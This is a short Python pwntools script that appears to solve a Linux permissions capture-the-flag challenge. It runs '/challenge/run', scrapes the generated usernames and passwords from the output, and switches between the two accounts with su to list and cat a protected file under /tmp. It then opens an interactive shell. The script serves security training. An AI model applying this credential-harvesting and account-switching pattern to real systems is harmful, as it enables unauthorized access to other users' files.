#!/usr/bin/python3

from pwn import *
import re

context.log_level = 'error'

io = process("/challenge/run")

data = io.recvall().decode()

#print(data)
l = re.findall(r"dr-xr-x--x 2 root   [a-z_]+ 4096 [A-Z][a-z]{2} [0-3][0-9] [0-9][0-9]:[0-9][0-9] [a-z0-9_]+",data)
li = re.findall(r"Created user [a-z_]+ with password [a-z]+",data)
io.close()

u1 = li[0].split('Created user ')[1].split(' with password ')[0].strip()
p1 = li[0].split('Created user ')[1].split(' with password ')[1].strip()
u2 = li[1].split('Created user ')[1].split(' with password ')[0].strip()
p2 = li[1].split('Created user ')[1].split(' with password ')[1].strip()
#print(u1,p1,"\n",u2,p2,l)

username = [u1 for lis in l if u1 in lis]
password = [p1 for lis in l if u1 in lis]
if username == []:
    username = u2
    password = p2
else:
    username = username[0].strip()
    password = password[0].strip()
file_name =[lis.split()[-1] for lis in l if username in lis][0].strip()

#print(username,password,file_name)
#print(file_name[0])

io = process(['su',username])
io.sendline(password.encode())

io.sendline(b'ls /tmp/'+file_name.encode())
data = io.recvline().decode()
file = data.split()[1].strip()

username = u1 if username == u2 else u2
password = p2 if username == u2 else p1
#print(username,password)
io.sendline(b'su '+username.encode())
io.sendline(password.encode())
io.sendline(b'cat /tmp/'+file_name.encode()+b'/'+file.encode())


io.interactive()
